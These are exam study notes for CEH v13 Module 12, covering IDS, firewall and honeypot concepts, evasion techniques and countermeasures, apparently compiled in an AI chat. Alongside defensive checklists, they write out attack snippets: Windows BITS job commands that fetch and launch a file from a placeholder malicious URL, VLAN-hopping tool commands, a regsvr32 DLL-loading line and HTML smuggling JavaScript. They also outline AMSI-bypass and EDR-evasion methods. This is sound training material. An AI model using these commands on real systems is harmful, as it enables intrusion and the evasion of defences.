# Module 12: Evading IDS, Firewalls, and Honeypots

> **Exam:** 312-50
**Source:** EC-Council Official Curricula — CEH v13
> 

---

## 📋 Table of Contents

1. [IDS, IPS, and Firewall Concepts](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#1-ids-ips-and-firewall-concepts)
2. [IDS, IPS, and Firewall Solutions](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#2-ids-ips-and-firewall-solutions)
3. [Bypassing IDS/Firewalls](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#3-bypassing-idsfirewalls)
4. [Bypassing NAC and Endpoint Security](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#4-bypassing-nac-and-endpoint-security)
5. [Honeypot Concepts](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#5-honeypot-concepts)
6. [IDS/Firewall Evasion Countermeasures](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#6-idsfirewall-evasion-countermeasures)
7. [Quick Exam Cheat Sheet](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#7-quick-exam-cheat-sheet)

---

## 1. IDS, IPS, and Firewall Concepts

### 🎯 Intrusion Detection System (IDS)

> A security software/hardware device used to **monitor, detect, and protect** networks/systems from malicious activities. Checks traffic for signatures matching known intrusion patterns and signals an alarm when a match is found.
> 

**Main Functions of IDS:**

- Gathers/analyzes info to identify security policy violations (unauthorized access, misuse)
- Also referred to as a "**packet sniffer**" — intercepts packets via TCP/IP
- Packets analyzed AFTER capture
- Evaluates traffic for suspected intrusions, raises alarm

**How IDS Works (Preprocessor Flow):**

```
Traffic → Signature File Comparison → Matched? → Action Rule (alarm/drop/cut connection)
                    ↓ No match
              Anomaly Detection → Matched? → Action Rule
                    ↓ No match
           Stateful Protocol Analysis → Matched? → Action Rule
```

---

### 🚨 Intrusion Prevention System (IPS)

> Considered an **active IDS** — capable of not only detecting but also **preventing** intrusions. Placed **inline** (between source and destination) vs IDS which is passive.
> 

**IPS Actions:**

- Generate alerts for abnormal traffic
- Continuously record real-time logs
- Block and filter malicious traffic
- Detect/eliminate threats quickly (inline placement)
- Identify threats accurately without false positives

---

### 📊 3 IDS Detection Methods (CRITICAL TABLE)

| Method | Description |
| --- | --- |
| **Signature Recognition** (misuse detection) | Creates models of possible intrusions, compares with incoming events. Compares packets with binary signatures of known attacks via pattern-matching |
| **Anomaly Detection** ("not-use detection") | Detects intrusion based on FIXED behavioral characteristics of users/components. Any deviation from regular use = attack. Establishing a "normal use" model is the hardest step |
| **Protocol Anomaly Detection** | Analyzes network traffic for deviations from established protocol standards/expected behavior. Steps: Baseline behavior → Anomaly identification → Detection rules |

> ⚠️ Signature recognition detects known attacks but can trigger false positives; large signature databases require more bandwidth and can drop packets.
> 

---

### 📊 Types of Intrusion Detection Systems

| Type | Description |
| --- | --- |
| **Network-Based IDS (NIDS)** | Black box placed on network in promiscuous mode, listens for intrusion patterns. Checks EVERY packet entering the network. Detects DoS attacks, port scans, break-in attempts. More distributed than HIDS |
| **Host-Based IDS (HIDS)** | Includes auditing for events on a SPECIFIC host. Less common due to overhead of monitoring every system event. Uses agents on each monitored host |

---

### 🔥 Firewall Concepts

> A firewall verifies incoming/outgoing traffic against its rules and acts as a router to move data between networks. Allows or denies access requests from one side to services on the other.
> 

**Firewall functions:** Identify login attempts for auditing, filter packets based on address/traffic type, recognize source/destination addresses and port numbers (address filtering), identify traffic types (protocol filtering), identify packet state/attributes.

---

### 📊 Firewall Technologies by OSI Layer (CRITICAL TABLE)

| OSI Layer | Firewall Technology |
| --- | --- |
| **Application** | VPN, Application Proxies |
| **Presentation** | VPN |
| **Session** | VPN, Circuit-Level Gateways |
| **Transport** | VPN, Packet Filtering |
| **Network** | VPN, NAT, Packet Filtering, Stateful Multilayer Inspection |
| **Data Link** | VPN, Packet Filtering |
| **Physical** | Not Applicable |

---

### 🔧 7 Firewall Technologies (Types)

```
Packet Filtering | Circuit-Level Gateways | Application-Level Firewall |
Stateful Multilayer Inspection | Application Proxies |
Network Address Translation (NAT) | Virtual Private Network (VPN)
```

**Packet Filtering Firewall:** Each packet compared with a set of criteria before being forwarded. Rules include source/destination IP, source/destination port, protocol. Works at internet layer of TCP/IP (network layer of OSI). Decision based on:

- **Source IP address** — from IP header
- **Destination IP address** — from IP header

**Next-Generation Firewalls (NGFWs):** Sophisticated solutions performing traditional firewall functions + deep packet inspection, application awareness, integrated IPS, cloud-based threat intelligence.

**VPN (Virtual Private Network):** Secure access to private network via Internet. Encrypts traffic, checks integrity protection, encapsulates new packets, decrypts traffic eventually. **Note: VPNs have no relation to firewall technology**, but firewalls are convenient for adding VPN features.

---

### 🏛️ DMZ (Demilitarized Zone)

> Buffer network zone between the corporate network (Intranet) and the public Internet, containing servers accessible from outside (web, DNS, mail servers). Sensitive internal servers should NOT reside in the DMZ.
> 

```
Internet ↔ Firewall ↔ DMZ (web/DNS/mail servers) ↔ Corporate Network (Intranet)
```

---

## 2. IDS, IPS, and Firewall Solutions

### 🛠️ Intrusion Detection using YARA Rules

> **YARA** is a malware research tool allowing security analysts to detect/classify malware via a rule-based approach. Multi-platform (Windows, macOS, Linux). Rules use Boolean expressions and strings (hex or plain text) to detect malware signatures.
> 

---

## 3. Bypassing IDS/Firewalls

### 📊 15 IDS/Firewall Evasion Techniques (CRITICAL — MEMORIZE)

```
1. Firewalking                        9. ACK Tunneling and HTTP Tunneling
2. Banner Grabbing                    10. SSH and DNS Tunneling
3. IP Address Spoofing                11. Through External Systems
4. Source Routing                     12. Through MITM Attack
5. Tiny Fragments                     13. Through Content and XSS Attack
6. Using an IP Address in Place of a URL   14. Through HTML Smuggling
7. Using a Proxy Server                15. Through Windows BITS
8. ICMP Tunneling
```

> Also includes: Port Scanning, Using Anonymous Website Surfing Sites
> 

---

### 🎯 IDS/Firewall Identification (Recon Phase)

| Technique | Description |
| --- | --- |
| **Port Scanning** | Identifies open ports and services. Some firewalls/IDS uniquely identify themselves via port scans (e.g., ManageEngine Firewall Analyzer listens UDP 514/1514; Snort listens TCP 80/UDP 53) |
| **Firewalking** | Uses **TTL values** to determine gateway ACL filters, maps networks by analyzing IP packet responses. Sends TCP/UDP packets with TTL = one hop greater than the targeted firewall. Tools: **Firewalk, Nmap firewalk script** |
| **Banner Grabbing** | Simple fingerprinting method — detects vendor/firmware version from service announcement banners |

---

### 🎯 IP Address Spoofing

> Attacker changes the source IP address of packets to a **trusted host's IP** so the target believes the packets are from a trusted source, bypassing IDS/firewall filtering rules.
> 

---

### 🎯 Source Routing

> Sender designates the route via less-secured/less-monitored network segments where IDS/firewall isn't fully installed. Reduces chances of triggering alerts.
> 

| Type | Description |
| --- | --- |
| **Loose Source Routing** | Sender specifies ONE OR MORE stages the packet must go through |
| **Strict Source Routing** | Sender specifies the EXACT route the packet must go through |

---

### 🎯 Tiny Fragments

> Attackers create tiny fragments of outgoing packets, forcing TCP header info into the NEXT fragment. Makes it difficult for IDS to reassemble the traffic stream for pattern matching. Succeeds if the filtering router examines only the FIRST fragment and passes the rest through.
> 

---

### 🎯 Using an IP Address in Place of a URL

> Bypasses blocked sites by typing the IP address directly into the browser instead of the domain name. Use services like **Host2ip** to find the IP. Fails if the blocking software tracks the IP address sent to the web server.
> 

---

### 🎯 Tunneling Techniques

| Technique | Description |
| --- | --- |
| **ICMP Tunneling** | Tunnels a backdoor shell in the DATA portion of ICMP Echo packets. RFC 792 doesn't define what should go in the data portion — arbitrary payload (including backdoor apps) evades most firewalls/IDS. Tool: **ICMPTX** |
| **ACK Tunneling** | Leverages the trusted nature of ACK packets (less scrutinized than SYN packets). Attacker establishes legitimate TCP connection, then crafts ACK packets with malicious payloads using tools like **Hping** or **Nping** |
| **HTTP Tunneling** | Tunnels traffic disguised as legitimate HTTP traffic |
| **SSH Tunneling** | Uses SSH port forwarding (local/remote) to tunnel traffic through an encrypted channel, bypassing firewalls |
| **DNS Tunneling** | Encodes data within DNS queries/responses |

---

### 🎯 Bypassing an IDS/Firewall through Fragmentation Timeout Attacks

**Attack Scenario 1:** Attacker sends fragments manipulating order/timing. Succeeds when the **NIDS fragmentation reassembly timeout is LESS than the victim's** reassembly timeout — NIDS drops fragments before reassembly while victim still accepts them.

**Attack Scenario 2:** Works when the IDS timeout EXCEEDS that of the victim. Attacker sends false-payload fragments first, waits for victim's timeout to expire and drop them, then sends the real payload fragments — IDS reassembles with invalid checksums and drops, but victim never saw the fake fragments.

---

### 🎯 Desynchronization

| Technique | Description |
| --- | --- |
| **Pre-Connection SYN** | Sends an initial SYN before the real connection with an INVALID TCP checksum. If the IDS doesn't check checksums, it desynchronizes from the real connection |
| **Post-Connection SYN** | Sends a SYN packet in the data stream with divergent sequence numbers after a connection is established. Target host ignores it (already established), but IDS resynchronizes to the new SYN, then loses track of legitimate traffic |

---

### 🎯 Domain Generation Algorithms (DGA)

> Software program attackers use to generate numerous new domain names to evade traditional detection (security gateways, signature filters that block static IPs/domains). Uses a shared "**seed**" (number/phrase known to both attacker and C2 server) to generate "gibberish" domain names (e.g., `isdfcbdjdnfuylt.ru`) as rendezvous points for C2 communication.
> 

---

### 🎯 HTML Smuggling

> Web attack injecting malicious code into an HTML script to compromise a web page. Manipulates HTML5/JavaScript features to stay hidden from firewalls, web proxies, email gateways. Uses a JavaScript-based **blob** with compatible MIME type set to auto-download malware.
> 

```html
<a href="malicious.doc" download="Myfile.doc">Click</a>
```

```jsx
var myAnchorElement = document.createElement('a');
myAnchorElement.download = 'Myfile.doc';
var myfileUrl = window.URL.createObjectURL(fakeBlob);
myAnchor.href = myfileUrl; myAnchor.click();
```

Tool: **HTML Smuggler**

---

### 🎯 Windows BITS (Background Intelligent Transfer Service) Evasion

> Attackers use BITS to transfer malicious files as trusted background jobs, bypassing firewalls/IDS since BITS jobs run at system level and are considered trusted.
> 

```bash
/create persistence
/addfile persistence <Malicious URL> <Local Path>
/SetNotifyCmdLine persistence <Local Path> NULL
/resume persistence
```

**Countermeasures:** Use BitsParser to evaluate BITS traffic, avoid downloading suspicious files, keep system updated, monitor BITS-client event log, integrate with SIEM, use GPOs to manage BITS settings, limit max job age, audit BITS jobs regularly, limit user accounts' ability to create BITS jobs.

---

## 4. Bypassing NAC and Endpoint Security

### 🎯 Bypassing NAC using VLAN Hopping

> Attackers gain access to all VLANs via **Dynamic Trunking Protocol (DTP)**. Setting switch mode to "dynamic auto" or "dynamic desirable" allows DTP packet forwarding to establish a trunk.
> 

**Tool: VLANPWN**

```bash
python3 DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 --victim <IP> --attacker <IP>
python3 DTPHijacking.py --interface eth0
```

---

### 🎯 Bypassing NAC using Pre-authenticated Device

> Attackers gain access to an already-authenticated device and use it to bypass NAC, smuggling network packets from a different device. Attacker places their device (e.g., **Raspberry Pi**) between the pre-authenticated device and the authentication server to ensure traffic flows through the attacker's device.
> 

**Tools:** `nac_bypass_setup.sh`, **FENRIR**, NACkered, Silentbridge, BITM

---

### 🎯 Bypassing Endpoint Security — Key Techniques

| Technique | Description |
| --- | --- |
| **Ghostwriting** | Modifies malware code structure WITHOUT affecting functionality — binary deconstruction, arbitrary assembly code insertion, reconstruction. Evades signature-based AV detection. Tool: **Ghostwriting.sh** |
| **Application Whitelisting Bypass** | Exploits DLL hijacking — places malicious DLL with legitimate name in directory the whitelisted app looks for DLLs in. Uses rundll32.exe, regsvr32.exe, PowerShell (`regsvr32.exe /s /n /u /i:"C:\path_to_malicious.dll"`) |
| **Process Injection** | Injects malware into memory space of a RUNNING process via Windows API: `VirtualAllocEx()` (allocate memory) → `WriteProcessMemory()` (write payload) → `CreateRemoteThread()` (execute injected code) |
| **CPL (Control Panel) Side-Loading** | Mimics original CPL applet functionality; when legitimate CPL executes, it also loads embedded malicious code. Tool: **CPLResourceRunner** |
| **Direct System Calls** | Evades hooks in ntdll.dll by calling kernel-equivalent syscalls directly (e.g., NtAllocateVirtualMemory instead of VirtualAlloc) — evades "Mark of the Syscall" detection |
| **Spoofing the Thread Call Stack** | Discards link between return address and shellcode by intercepting the `Sleep()` function, hiding implant during dormant/beaconing state |
| **In-memory Encryption of Beacon** | Encrypts executable memory regions during dormant state (via XOR) at `Sleep()` hooks; decrypts upon resuming — bypasses memory-scanning EDR |
| **AMSI Bypass (Memory Hijacking)** | Hooks `AmsiScanBuffer()` function, forces it to always return `AMSI_RESULT_CLEAN`. Tool: **ASBBypass.dll** |
| **AI-Assisted Evasion** | Uses tools like ChatGPT to generate mutated/unique code each time, decreasing AV signature detection rates |

---

## 5. Honeypot Concepts

### 🎯 What is a Honeypot?

> An information system resource **expressly set up to attract and trap** people who attempt to penetrate an organization's network. Has NO authorized activity, NO production value — any traffic to it is likely a probe, attack, or compromise. Can log port access attempts or monitor attacker keystrokes as early warnings.
> 

---

### 📊 Types of Honeypots (CRITICAL — Comprehensive Classification)

**By Design Criteria:**

| Type | Description |
| --- | --- |
| **Low-interaction Honeypots** | Simulate only a LIMITED number of services/applications. Generate error if attacker does something unexpected. Capture limited info (transactional data). Cannot be fully compromised. Examples: tiny-ssh-honeypot, **KFSensor**, **Honeytrap** |
| **Medium-interaction Honeypots** | Simulate a REAL operating system, applications, and services of a target network |
| **High-interaction Honeypots** | Simulate ALL services and applications of a target network |
| **Pure Honeypots** | Emulate the REAL production network of a target organization |

**By Deployment Strategy:**

```
Production Honeypots | Research Honeypots
```

**By Deception Technology:**

```
Malware Honeypots | Database Honeypots
Spam Honeypots    | Email Honeypots
Spider Honeypots  | Honeynets
```

- **KFSensor:** Low-interaction honeypot implementing vulnerable system services/Trojans to attract hackers; monitors TCP/UDP/ICMP ports; identifies/alerts on port scanning and DoS attacks
- **Honeytrap:** Low-interaction honeypot observing attacks against TCP/UDP services; runs as daemon; stores "attack strings" in a database; supports FTP/TFTP; logs HTTP_URIs

**Honeypot Tools:** HoneyBOT, Blumira honeypot software, NeroSwarm Honeypot, Valhala Honeypot, Cowrie, StingBox

---

### 🔍 Detecting Honeypots (5 Methods — CRITICAL TABLE)

| Method | Tool/Command | Indicators |
| --- | --- | --- |
| **Fingerprinting the Running Service** | `nmap -sV -p 80 <target_ip>` | Discrepancies between claimed and actual service behaviors |
| **Analyzing Response Time** | `nmap -p 80 --scan-delay 1s --max-retries 5 <target_ip>` (Ping, Traceroute) | Consistently higher response times and variability |
| **Analyzing MAC Address** | `arp-scan --interface=eth0 --localnet` | MAC addresses with unusual Organizationally Unique Identifiers (OUI) |
| **Enumerating Unexpected Open Ports** | `nmap -p- <target_ip>` | Open ports that don't align with expected services (e.g., extra 22/21 open on a web server expected to only have 80/443) |
| **Analyzing System Configuration and Metadata** | Examine banners, config settings, metadata | Default configurations, outdated banners, discrepancies in system info |

---

## 6. IDS/Firewall Evasion Countermeasures

### 🛡️ How to Defend Against IDS Evasion (14-Point Checklist — CRITICAL)

1. Shut down switch ports associated with known attack hosts
2. Perform in-depth analysis of ambiguous network traffic for all possible threats
3. Use TCP FIN or Reset (RST) packet to terminate malicious TCP sessions
4. Look for the nop opcode other than 0x90 to defend against polymorphic shellcode
5. Train users to identify attack patterns; regularly update/patch systems and network devices
6. Deploy IDS after thorough analysis of network topology, traffic nature, and hosts to monitor
7. Use a traffic normalizer to remove potential ambiguity before it reaches the IDS
8. Ensure the IDS normalizes fragmented packets and reassembles them in proper order
9. Define DNS server for client resolver in routers/similar network devices
10. Harden the security of all communication devices (modems, routers)
11. Block ICMP TTL expired packets at the external interface; change TTL field to large value
12. Regularly update the antivirus signature database
13. Use a traffic normalization solution at the IDS to protect against evasions
14. Store attack information (attacker IP, victim IP, timestamp) for future analysis

---

### 🛡️ How to Defend Against Firewall Evasion (14-Point Checklist — CRITICAL)

1. Configure the firewall to filter out an intruder's IP address
2. Set the firewall ruleset to **deny all traffic**, enable only required services
3. Create a unique user ID to run firewall services (not admin/root ID)
4. Configure a remote syslog server; protect it from malicious users
5. Monitor firewall logs at regular intervals; investigate suspicious entries
6. By default, disable all FTP connections to/from the network
7. Catalog and review all inbound/outbound traffic allowed through the firewall
8. Run regular risk queries to identify vulnerable firewall rules
9. Monitor user access; control who can modify the firewall configuration
10. Specify source/destination IP addresses and ports
11. Notify security policy administrator about firewall changes; document them
12. Control physical access to the firewall
13. Take regular backups of the firewall ruleset and configuration files
14. Schedule regular firewall security audits
15. Use **HTTP Evader** to run automated testing for suspected firewall evasions
16. Use deep packet inspection at the application layer
17. Set limits on connections allowed per IP address
18. Restrict traffic based on geographical regions
19. Create firewall rules based on user behavior rather than just IP addresses
20. Adopt a **zero-trust security model** assuming zero trust for internal AND external traffic
21. Look for integrated HTTPS/TLS inspection to defend against evasions

---

## 7. Quick Exam Cheat Sheet

### 🔑 IDS vs IPS

```
IDS = Passive, detects only, placed to monitor (promiscuous mode)
IPS = Active, detects AND prevents, placed INLINE (between source/destination)
```

---

### 📊 3 IDS Detection Methods

```
Signature Recognition | Anomaly Detection | Protocol Anomaly Detection
```

---

### 📊 Types of IDS

```
NIDS (Network-Based) → checks every packet entering network, promiscuous mode
HIDS (Host-Based)     → audits events on a specific host
```

---

### 📊 15 IDS/Firewall Evasion Techniques

```
Firewalking | Banner Grabbing | IP Address Spoofing | Source Routing |
Tiny Fragments | IP instead of URL | Proxy Server | ICMP Tunneling |
ACK/HTTP Tunneling | SSH/DNS Tunneling | External Systems | MITM Attack |
Content/XSS Attack | HTML Smuggling | Windows BITS
```

---

### 📊 Honeypot Classification (by Design)

```
Low-interaction    → limited services, cannot be fully compromised
Medium-interaction → real OS, applications, services
High-interaction   → ALL services/apps simulated
Pure Honeypots     → real production network emulated
```

---

### 🔍 5 Honeypot Detection Methods

```
Fingerprinting Running Service | Analyzing Response Time |
Analyzing MAC Address (OUI) | Enumerating Unexpected Open Ports |
Analyzing System Configuration/Metadata
```

---

### 🔥 Common Exam Scenarios

**Q: What's the key difference between IDS and IPS?**
→ IDS is passive (detects only); IPS is active/inline (detects AND prevents)

**Q: What technique uses TTL values to map firewall ACL rules?**
→ **Firewalking**

**Q: What technique creates tiny outgoing packet fragments to force TCP headers into the next fragment?**
→ **Tiny Fragments**

**Q: What's the difference between loose and strict source routing?**
→ Loose = sender specifies one or more stages; Strict = sender specifies the EXACT route

**Q: What technique tunnels a backdoor shell in the data portion of ICMP Echo packets?**
→ **ICMP Tunneling** (tool: ICMPTX)

**Q: What technique exploits the fact that ACK packets are less scrutinized than SYN packets?**
→ **ACK Tunneling**

**Q: What technique uses a shared "seed" to generate gibberish domain names for C2 communication?**
→ **Domain Generation Algorithms (DGA)**

**Q: What web attack injects malicious code into HTML/JavaScript to evade firewalls and email gateways?**
→ **HTML Smuggling**

**Q: What protocol do attackers exploit for VLAN Hopping to bypass NAC?**
→ **Dynamic Trunking Protocol (DTP)**

**Q: What technique modifies malware code structure without affecting functionality to evade signature detection?**
→ **Ghostwriting**

**Q: What Windows API sequence is used for process injection?**
→ `VirtualAllocEx()` → `WriteProcessMemory()` → `CreateRemoteThread()`

**Q: What function does AMSI bypass hook to force a "clean" result?**
→ `AmsiScanBuffer()` — forced to return `AMSI_RESULT_CLEAN`

**Q: What are the 4 honeypot types classified by design criteria?**
→ **Low-interaction, Medium-interaction, High-interaction, Pure Honeypots**

**Q: What honeypot detection method uses `nmap -p- <target_ip>`?**
→ **Enumerating Unexpected Open Ports**

**Q: What honeypot detection method analyzes the Organizationally Unique Identifier of network cards?**
→ **Analyzing MAC Address**

**Q: What's a common indicator that a target might be a honeypot based on response times?**
→ Consistently HIGHER and more variable response times than expected (extra logging/monitoring overhead)

**Q: At which OSI layers does Packet Filtering operate?**
→ **Network and Transport layers** (also Data Link layer per the table)

**Q: Does a VPN relate to firewall technology?**
→ No — VPNs have NO inherent relation to firewall technology, but firewalls are often used to add VPN features for convenience

---

*Notes compiled from CEH v13 Official Curricula — EC-Council | Exam 312-50 | Module 12*